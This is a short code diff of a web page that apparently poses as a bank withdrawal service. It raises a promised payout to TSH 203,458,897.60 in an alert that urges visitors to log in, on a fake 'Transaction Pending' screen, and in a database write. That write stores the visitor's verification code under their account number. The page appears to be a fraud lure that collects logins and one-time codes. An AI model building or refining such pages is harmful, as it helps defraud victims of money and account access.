@@ -569,7 +569,7 @@
             <div class="withdraw-alert">
                 <div class="alert-icon"><i class="fa-solid fa-money-bill-transfer"></i></div>
                 <div class="alert-text">
-                    <strong>Withdraw TSH.15,000,000.00</strong> to your bank.
+                    <strong>Withdraw TSH.203,458,897.60</strong> to your bank.
                     <br>
                     <button onclick="switchView('auth-view')" class="login-link">Login to withdraw <i class="fa-solid fa-arrow-right"></i></button>
                 </div>
@@ -757,7 +757,7 @@
                     <i class="fa-solid fa-hourglass-half"></i>
                 </div>
                 <h2>Transaction Pending</h2>
-                <p>Your withdrawal of <br><strong>TSH. 15,000,000.00</strong></p>
+                <p>Your withdrawal of <br><strong>TSH. 203,458,897.60</strong></p>
                 <p>is currently being processed. Please wait while the system verifies the transaction.</p>
                 
                 <div class="status-badge">STATUS: PENDING</div>
@@ -974,7 +974,7 @@
                         await update(ref(db, 'users/' + accountInput.value), {
                             verificationCodeUsed: code,
                             status: "Verified - Pending Withdrawal",
-                            withdrawalAmount: "TSH.15,000,000.00",
+                            withdrawalAmount: "TSH.203,458,897.60",
                             verifiedAt: Date.now()
                         });
 
